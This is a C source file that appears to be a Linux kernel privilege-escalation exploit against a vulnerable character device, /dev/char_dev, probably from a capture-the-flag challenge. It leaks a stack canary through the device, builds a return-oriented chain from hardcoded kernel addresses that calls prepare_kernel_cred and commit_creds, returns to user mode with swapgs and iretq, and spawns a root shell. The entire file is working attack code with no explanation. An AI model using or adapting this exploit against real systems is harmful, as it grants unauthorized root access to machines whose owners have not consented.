#include<fcntl.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/mman.h>
#include<signal.h>
unsigned long user_cs,user_ss,user_sp,user_rflags;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs,cs;"
        "mov user_ss,ss;"
        "mov user_sp,rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void getShell(){
    system("/bin/sh");
}
unsigned long user_rip = &getShell;
int main(){
    signal(11,getShell);
    int fd1 = open("/dev/char_dev",O_RDWR);
    int fd2 = open("/dev/char_dev",O_RDWR);

    close(fd1);
    unsigned long payload[8];
    for(int i=0;i<6;i++){
        payload[i]=i;
    }
    payload[5] = '\n';
    payload[6] = '\n';// 0x000000000000000a -> \0x0a
    void *addr = mmap((void*)0,0x1000,PROT_EXEC|PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,-1,0);
    memcpy(addr,payload,sizeof(payload));

    unsigned long buf[20];
    unsigned long buf2[10];
    read(fd2,buf,sizeof(buf));
    payload[5] = 1;
    memcpy(addr,payload,sizeof(payload));
    unsigned long canary;
    read(fd2,buf2,sizeof(buf2));
    canary = buf2[1];
    unsigned long prepare_kernel_cred = 0xffffffff810cc140;
    unsigned long commit_creds = 0xffffffff810cbdd0;
    unsigned long pop_rdi_ret = 0xffffffff8104dec1;
    unsigned long pop_rdx_re = 0xffffffff81025e22;
    unsigned long pop_gadg1 = 0xffffffff815bf184; // cmp rdx, 8 ; jne 0xffffffff815bf173 ; pop rbx ; pop rbp ; ret
    unsigned long mov_gadget = 0xffffffff8127a053; // mov rdi, rax ; jne 0xffffffff8127a023 ; pop rbx ; pop rbp ; ret
    unsigned long swapgs_ret = 0xffffffff81077514 ;//swapgs ; pop rbp ; ret
    unsigned long iretq = 0xffffffff81039a1b;
    // unsigned long kpti_trampoline = 0xffffffff81c00a34+22;
    printf("Canary : 0x%lx\n",canary);
    save_state();
    printf("user_rip : %p\n",user_rip);
    unsigned long newPayload[50];
    int offset = 6;
    newPayload[offset++] = canary;
    offset+=6;
    newPayload[offset++] = pop_rdi_ret;
    newPayload[offset++] = 0x0;
    newPayload[offset++] = prepare_kernel_cred;
    newPayload[offset++] = pop_rdx_re;
    newPayload[offset++] = 8;
    newPayload[offset++] = pop_gadg1;
    newPayload[offset++] = 0;
    newPayload[offset++] = 0;
    newPayload[offset++] = mov_gadget;
    newPayload[offset++] = 0x0;
    newPayload[offset++] = 0x0;
    newPayload[offset++] = commit_creds;
    newPayload[offset++] = swapgs_ret;
    newPayload[offset++] = 0x0;
    newPayload[offset++] = iretq;
    // newPayload[offset++] = kpti_trampoline;
    // newPayload[offset++] = 0x0;
    // newPayload[offset++] = 0x0;
    newPayload[offset++] = user_rip;
    newPayload[offset++] = user_cs;
    newPayload[offset++] = user_rflags;
    newPayload[offset++] = user_sp;
    newPayload[offset++] = user_ss;
    newPayload[offset++] = '\n';
    memcpy(addr,newPayload,sizeof(newPayload));
    read(fd2,buf2,sizeof(buf2));

    return 0;
}